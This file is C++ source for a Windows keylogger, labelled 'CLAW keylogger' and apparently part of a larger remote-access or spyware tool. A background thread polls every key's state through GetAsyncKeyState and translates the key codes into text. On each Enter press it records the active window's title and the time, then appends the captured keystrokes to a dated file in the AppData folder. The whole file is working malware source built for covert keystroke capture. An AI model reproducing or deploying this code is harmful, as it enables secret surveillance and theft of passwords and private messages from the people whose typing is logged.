#include "Probe.h"
#include "base64.h"

// CLAW keylogger


bool System::hookShift() {
	if (GetKeyState(VK_LSHIFT) < -120) { return true; }
	if (GetKeyState(VK_RSHIFT) < -120) { return true; }
	return false;
}

bool System::capsLock() {
	if (GetKeyState(VK_CAPITAL) == 1) { return true; }
	if (GetKeyState(VK_CAPITAL) == -127) { return true; }
	return false;
}


int System::filter(int key) {
	if ((key >= 65) && (key <= 90)) {
		if ((!hookShift()) && (!capsLock())) {
			key += 32;
		}
	}
	else if ((key >= 48) && (key <= 57)) {
		if (hookShift()) {
			switch (key) {
			case '1': key = '!'; break;
			case '2': key = '@'; break;
			case '3': key = '#'; break;
			case '4': key = '$'; break;
			case '5': key = '%'; break;
			case '6': key = '^'; break;
			case '7': key = '&'; break;
			case '8': key = '*'; break;
			case '9': key = '('; break;
			case '0': key = ')'; break;
			}
		}
	}
	if (hookShift()) {
		if (key == 186) { key = ':'; }
		else if (key == 187) { key = '+'; }
		else if (key == 188) { key = '<'; }
		else if (key == 189) { key = '_'; }
		else if (key == 190) { key = '>'; }
		else if (key == 191) { key = '?'; }
		else if (key == 192) { key = '~'; }

		else if (key == 219) { key = '{'; }
		else if (key == 220) { key = '|'; }
		else if (key == 221) { key = '}'; }
		else if (key == 222) { key = '"'; }
	}

	else {
		if (key == 186) { key = ';'; }
		else if (key == 187) { key = '='; }
		else if (key == 188) { key = ','; }
		else if (key == 189) { key = '-'; }
		else if (key == 190) { key = '.'; }
		else if (key == 191) { key = '/'; }
		else if (key == 192) { key = '~'; }

		else if (key == 219) { key = '['; }
		else if (key == 220) { key = '\\'; }
		else if (key == 221) { key = ']'; }
		else if (key == 222) { key = '\''; }
	}

	return key;
}

std::string System::KeylogFileName(int mode)
{
	time_t t = time(0);
	struct tm* now = localtime(&t);
	char buffer[100] = { 0 };
	memset(buffer, '\0', 100);
	strftime(buffer, 100, "%Y-%m-%d", now);
	if (mode == 0)
	{
		// return full path
		return std::string(appDataPath()) + "\\" + std::string(buffer) + ".rhpkl";
	}
	else {
		// return filename only
		return std::string(buffer) + ".rhpkl";
	}
	
}

std::string System::WindowStamp()
{
	char title[500];
	char buffer[100] = { 0 };
	memset(title, '\0', 500);
	HWND hwnd = GetForegroundWindow();
	GetWindowText(hwnd, (LPSTR)title, 500);
	time_t t = time(0);
	struct tm* now = localtime(&t);
	memset(buffer, '\0', 100);
	strftime(buffer, 100, "%Y-%m-%d-%S", now);

	return "[ " + std::string(title) + " - " + std::string(buffer) + " ] ";
}

int System::filesize(const char* filename)
{
	if (isFile(filename)) {
		FILE* p_file = NULL;
		p_file = fopen(filename, "rb");
		fseek(p_file, 0, SEEK_END);
		int size = ftell(p_file);
		fclose(p_file);
		return size;
	}
	else {
		return 0;
	}
}
void System::Keylogger()
{
	if (filesize(KeylogFileName(0).c_str()) >= MAXKEYLOGSZ)
	{
		DeleteFile(KeylogFileName(0).c_str());
	}

	for (unsigned char c = 1; c < 255; c++) {
		SHORT rv = GetAsyncKeyState(c);
		if (rv & 1) {
			std::string out = "";
			if (c == 1)
				out = "";
			else if (c == 2)
				out = "";
			else if (c == 4)
				out = "";
			else if (c == 13)
				out = "\n[RETURN] " + WindowStamp() + "\n";
			else if (c == 16 || c == 17 || c == 18)
				out = "";
			else if (c == 160 || c == 161)
				out = "";
			else if (c == 162 || c == 163)
				out = "[STRG]";
			else if (c == 164)
				out = "[ALT]";
			else if (c == 165)
				out = "[ALT GR]";
			else if (c == 8)
				out = "[BACKSPACE]";
			else if (c == 9)
				out = "[TAB]";
			else if (c == 27)
				out = "[ESC]";
			else if (c == 33)
				out = "[PAGE UP]";
			else if (c == 34)
				out = "[PAGE DOWN]";
			else if (c == 35)
				out = "[HOME]";
			else if (c == 36)
				out = "[POS1]";
			else if (c == 37)
				out = "[ARROW LEFT]";
			else if (c == 38)
				out = "[ARROW UP]";
			else if (c == 39)
				out = "[ARROW RIGHT]";
			else if (c == 40)
				out = "[ARROW DOWN]";
			else if (c == 45)
				out = "[INS]";
			else if (c == 46)
				out = "[DEL]";
			else if ((c >= 65 && c <= 90)
				|| (c >= 48 && c <= 57)
				|| c == 32)
				out = filter(c);

			else if (c == 91 || c == 92)
				out = "[WIN]";
			else if (c >= 96 && c <= 105)
				out = "[NUM " + std::to_string(c - 96) + "]";
			else if (c == 106)
				out = "[NUM /]";
			else if (c == 107)
				out = "[NUM +]";
			else if (c == 109)
				out = "[NUM -]";
			else if (c == 110)
				out = "[NUM ,]";
			else if (c >= 112 && c <= 123)
				out = "[F" + std::to_string(c - 111) + "]";
			else if (c == 144)
				out = "[NUM]";
			else if (c == 192)
				out = filter(c);
			else if (c == 222)
				out = filter(c);
			else if (c == 186)
				out = filter(c);
			else if (c == 187)
				out = filter(c);
			else if (c == 188)
				out = filter(c);
			else if (c == 189)
				out = filter(c);
			else if (c == 190)
				out = filter(c);
			else if (c == 191)
				out = filter(c);
			else if (c == 226)
				out = filter(c);

			else
				out = "[KEY \\" + std::to_string(c) + "]";

			if (out != "")
			{
				std::ofstream file;
				file.open(KeylogFileName(0).c_str(), std::ios_base::app);
				file << out;
				file.close();
			}
		}
	}
}

DWORD WINAPI System::KEYLOG_THREAD(LPVOID lpParameter)
{
	while (TRUE)
	{
		Sleep(10);
		Keylogger();
	}
}

